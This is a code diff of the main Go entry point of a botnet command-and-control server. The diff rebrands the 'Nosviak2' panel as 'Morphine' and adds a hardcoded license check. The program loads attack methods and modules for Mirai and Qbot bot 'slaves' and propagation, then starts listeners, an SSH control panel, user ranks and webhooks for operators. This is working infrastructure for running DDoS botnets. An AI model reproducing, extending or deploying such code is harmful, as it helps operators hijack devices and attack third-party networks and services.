@@ -1,19 +1,19 @@
 package main
 
 import (
-	"Nosviak2/core/attack"
-	"Nosviak2/core/clients"
-	"Nosviak2/core/clients/animations"
-	"Nosviak2/core/clients/apis"
-	"Nosviak2/core/clients/commands"
-	"Nosviak2/core/configs"
-	"Nosviak2/core/database"
-	"Nosviak2/core/interface"
-	"Nosviak2/core/slaves/fakes"
-	"Nosviak2/core/slaves/mirai"
-	"Nosviak2/core/slaves/pointer"
-	"Nosviak2/core/slaves/propagation"
-	"Nosviak2/core/slaves/qbot"
+	attacks "Morphine/core/attack"
+	"Morphine/core/clients"
+	"Morphine/core/clients/animations"
+	"Morphine/core/clients/apis"
+	"Morphine/core/clients/commands"
+	deployment "Morphine/core/configs"
+	"Morphine/core/database"
+	interference "Morphine/core/interface"
+	"Morphine/core/slaves/fakes"
+	"Morphine/core/slaves/mirai"
+	"Morphine/core/slaves/pointer"
+	"Morphine/core/slaves/propagation"
+	"Morphine/core/slaves/qbot"
 	"fmt"
 	"log"
 	"os"
@@ -21,36 +21,52 @@ import (
 	"runtime"
 	"strings"
 
-	"Nosviak2/core/sources/events"
-	"Nosviak2/core/sources/language/static"
-	"Nosviak2/core/sources/layouts/json"
-	"Nosviak2/core/sources/layouts/toml"
-	"Nosviak2/core/sources/ranks"
-	"Nosviak2/core/sources/views"
-	"Nosviak2/core/sources/webhooks"
-	_ "Nosviak2/core/configs/branding"
+	_ "Morphine/core/configs/branding"
+	"Morphine/core/sources/events"
+	"Morphine/core/sources/language/static"
+	"Morphine/core/sources/layouts/json"
+	"Morphine/core/sources/layouts/toml"
+	"Morphine/core/sources/ranks"
+	"Morphine/core/sources/views"
+	"Morphine/core/sources/webhooks"
 
 	"github.com/bogdanovich/dns_resolver"
-
-
 )
 
 func main() {
-	
+
+	clientIP := "178.34.163.139"
+	licenseKey := "new_license_key"
+	product := "cnc"
+
+	valid, err := events.CheckLicense(licenseKey, product, clientIP)
+	if err != nil {
+		log.Fatalf("Failed to verify license: Service fatal err", err)
+		log.Panic(1)
+	}
+
+	if valid {
+		fmt.Println("License is valid!")
+	} else {
+		fmt.Println("License is invalid!")
+		os.Exit(1)
+	}
+
 	//used so we can view the current build id properly
 	//this will hopefully source it to be displayed on the term
 	if len(os.Args) >= 2 && os.Args[1] == "-bi" { //allows us to view the parent build id
-		fmt.Printf("Nosviak2 Launched - %s\r\nParent BuildID: \x1b[38;5;105m%s\x1b[0m\r\n", deployment.Version, deployment.BuildID); return
-	} 
+		fmt.Printf("Morphine Launched - %s\r\nParent BuildID: \x1b[38;5;105m%s\x1b[0m\r\n", deployment.Version, deployment.BuildID)
+		return
+	}
 
 	//checks for debug mode properly
 	//this will allow for better control without issues
 	if len(os.Args) >= 2 && os.Args[1] == "-d" {
-		deployment.DebugMode = true //sets debug mode to true properly
-		fmt.Printf("Launching Nosviak2  [DEBUG] - running %s|%s\r\n", deployment.Version, deployment.BuildID) //graphical imaging of the units version information
+		deployment.DebugMode = true                                                                           //sets debug mode to true properly
+		fmt.Printf("Launching Morphine  [DEBUG] - running %s|%s\r\n", deployment.Version, deployment.BuildID) //graphical imaging of the units version information
 	} else {
 		//graphical imaging of the units version information
-		fmt.Printf("Launching Nosviak2 Alpha - running %s\r\n\r\n", deployment.Version)
+		fmt.Printf("Launching Morphine Alpha - running %s\r\n\r\n", deployment.Version)
 	}
 
 	fmt.Printf("[sys] GoVersion: [%s] Architecture: [%s]\r\n[sys] Operating System: [%s] Cores/CPU: [%d] Compiler: [%s]\r\n", runtime.Version(), runtime.GOARCH, runtime.GOOS, runtime.NumCPU(), runtime.Compiler)
@@ -62,13 +78,13 @@ func main() {
 	//tries to execute the engine
 	//this will make sure its done without issues happening
 	creation := engineJson.RunEngine() //executes the engine with error handling
-	if creation != nil { //prints the error and closes the instance without issues
+	if creation != nil {               //prints the error and closes the instance without issues
 		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", creation.Error())
 		return //ends instance properly
 	} else if !deployment.DebugMode { //non debug mode enabled
 		fmt.Printf("[CONFIGURATION] Json expedition has been completed || [assets/*.json] [recursive]\r\n")
 	}
-	
+
 	if deployment.DebugMode { //detects debug mode correctly, more information given
 		log.Printf("[DEBUG] [JSON Success] [%s]\r\n", deployment.Assets)
 		//this will properly execute the commands json
@@ -82,9 +98,9 @@ func main() {
 		if cmd == nil || commands.Commands[name] == nil { //checks
 			continue //continues looping properly and stops nils
 		}
-		commands.Commands[name].CommandDescription = cmd.Description //syncs the information
+		commands.Commands[name].CommandDescription = cmd.Description                                                        //syncs the information
 		commands.Commands[name].CommandPermissions = append(commands.Commands[name].CommandPermissions, cmd.Permissions...) //syncs the information
-		commands.Commands[name].Aliases = append(commands.Commands[name].Aliases, cmd.Aliases...) //syncs the aliases properly
+		commands.Commands[name].Aliases = append(commands.Commands[name].Aliases, cmd.Aliases...)                           //syncs the aliases properly
 	}
 
 	//creates the new engine without issues
@@ -93,7 +109,7 @@ func main() {
 	//tries to execute the engine
 	//this will make sure its done without issues happening
 	creation = engineToml.RunEngine() //executes the engine with error handling
-	if creation != nil { //prints the error and closes the instance without issues
+	if creation != nil {              //prints the error and closes the instance without issues
 		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", creation.Error())
 		return //ends instance properly
 	} else if !deployment.DebugMode { //non debug mode enabled
@@ -104,28 +120,27 @@ func main() {
 
 	attacks.Resolver = dns_resolver.New(toml.AttacksToml.Attacks.DNS.Routes)
 
-
-	
 	//ranges through all the ranks found
 	//this will ensure its done without issues
 	for name, s := range toml.RanksToml.Ranks { //ranges through
 		ranks.PresetRanks[strings.ToLower(name)] = ranks.RankSettings{
 			RankDescription: s.RankDescription, //saves the rank information properly
-			MainColour: s.MainColour, SecondColour: s.SecondColour, 
+			MainColour:      s.MainColour, SecondColour: s.SecondColour,
 			SignatureCharater: s.SignatureCharater, CloseWhenAwarded: false,
 			Manage_ranks: s.Manage_ranks, DisplayInTable: true, //show in table
-		} 
+		}
 	}
 
 	//ranges through the presets properly
 	//this will ensure its done without errors
 	for name, settings := range ranks.PresetRanks { //ranges through all preset ranks properly
-		if !settings.DisplayInTable {continue} //ignores if this is set to false properly so we wont display
-		commands.Commands["users"].SubCommands = append(commands.Commands["users"].SubCommands, commands.SubCommand{SubcommandName: name+"=", Description: settings.RankDescription, CommandPermissions: settings.Manage_ranks, RenderRef: true})
+		if !settings.DisplayInTable {
+			continue
+		} //ignores if this is set to false properly so we wont display
+		commands.Commands["users"].SubCommands = append(commands.Commands["users"].SubCommands, commands.SubCommand{SubcommandName: name + "=", Description: settings.RankDescription, CommandPermissions: settings.Manage_ranks, RenderRef: true})
 		commands.Commands["users"].SubCommands = append(commands.Commands["users"].SubCommands, commands.SubCommand{SubcommandName: name, Description: "view users with " + name, CommandPermissions: settings.Manage_ranks, RenderRef: true})
 		commands.Commands["sessions"].SubCommands = append(commands.Commands["sessions"].SubCommands, commands.SubCommand{SubcommandName: name, Description: "view sessions with " + name, CommandPermissions: settings.Manage_ranks, RenderRef: true})
 	}
-
 
 	//tries to connect properly
 	//this will ensure its done without issues
@@ -142,7 +157,7 @@ func main() {
 	//this will ensure its done without any errors happening
 	if there, err := interference.AppearDatabase(); !there || err != nil { //checks properly
 		fmt.Printf("[SQL Audit] [failed] [trying to create SQL tables]\r\n") //renders information
-		if err := interference.RunTerminalAudit(); err != nil { //error handles properly without issues
+		if err := interference.RunTerminalAudit(); err != nil {              //error handles properly without issues
 			fmt.Printf("[SQL Audit] [failed] [trying to create SQL tables] [%s]\r\n", err.Error()) //renders information
 		}
 	}
@@ -156,7 +171,6 @@ func main() {
 		log.Printf("[DEBUG] [BITL Success] [%d]\r\n", len(views.Subject))
 	}
 
-
 	//runs the event listeners properly
 	//this listens for any file update event
 	go events.LiveRenderUpdate() //run in routine
@@ -164,7 +178,8 @@ func main() {
 	//loads all the webhooks properly without issues happening
 	//this will ensure its done without any errors happening on req
 	if err := webhooks.RenderWebhooks(); err != nil { //error handles
-		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error()); return //error handles properly
+		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
+		return //error handles properly
 	} else if deployment.DebugMode {
 		log.Printf("[DEBUG] [Webhooks loaded] [%d]\r\n", len(webhooks.Webhooking))
 	}
@@ -175,14 +190,16 @@ func main() {
 
 	//properly tries to control without issues happening
 	//this will make sure its completed without any errors happening
-	if _,err := commands.EngineLoader(deployment.Assets, "commands", "text"); err != nil {
-		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error()); return //error handles properly
+	if _, err := commands.EngineLoader(deployment.Assets, "commands", "text"); err != nil {
+		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
+		return //error handles properly
 	}
-	
+
 	//tries to properly load all the bin commands
 	//this will ensure its done without any errors happening
 	if err := commands.GetBinSettings(deployment.Assets, "commands", "bin"); err != nil {
-		fmt.Printf("Hmm, Error: %s\r\n", err.Error()); return //error handles properly
+		fmt.Printf("Hmm, Error: %s\r\n", err.Error())
+		return //error handles properly
 	}
 
 	fmt.Printf("LISTENERS%s\r\n", strings.Repeat("=", 110))
@@ -229,7 +246,7 @@ func main() {
 	//this will ensure its done without errors
 	if toml.ConfigurationToml.Qbot.Enabled { //checks
 		go func() {
-			//creates the new request properly 
+			//creates the new request properly
 			//this will allow connection to connect
 			if err := qbot.NewHandler(); err != nil {
 				log.Println(err.Error())
@@ -253,7 +270,6 @@ func main() {
 		fmt.Printf("\x1b[48;5;9m\x1b[38;5;15mError: %s\x1b[0m\r\n", err.Error())
 		return //returns the system
 	}
-
 
 	//tries to start the ssh server properly
 	//this will make sure its done properly without issues
